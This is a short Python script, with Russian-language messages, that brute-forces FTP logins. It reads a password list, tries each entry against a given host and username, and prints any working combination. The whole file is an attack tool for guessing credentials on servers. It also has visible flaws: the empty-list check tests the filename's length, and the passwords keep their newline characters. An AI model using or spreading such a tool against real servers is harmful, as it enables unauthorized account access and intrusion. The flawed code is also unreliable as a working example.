import sys
from ftplib import FTP

__author__ = 'mine_bit'


def brute(host, username, passwords_file):
    try:
        passwords = open(passwords_file, "r").readlines()
    except(IOError):
        print('[Ошибка] Не удалось найти файл с паролями!')
        sys.exit(1)
    if len(passwords_file) == 0:
        print('[Ошибка] Файл с паролями пуст!')
        sys.exit(1)
    for password in passwords:
        try:
            print('Пробуем пароль: ', password)
            ftp = FTP(host)
            ftp.login(username, password)
            ftp.retrlines('LIST')
            print('[!] Комбинация найдена:')
            print('[!] Имя пользователя: ' + username)
            print('[!] Пароль: ' + password)
            ftp.quit()
            break
        except:
            print('Пароль не подошел, или проблема с другими данными')

    else:
        print('[!] К сожалению, ни один из паролей не подошел, или проблема с другими данными!')
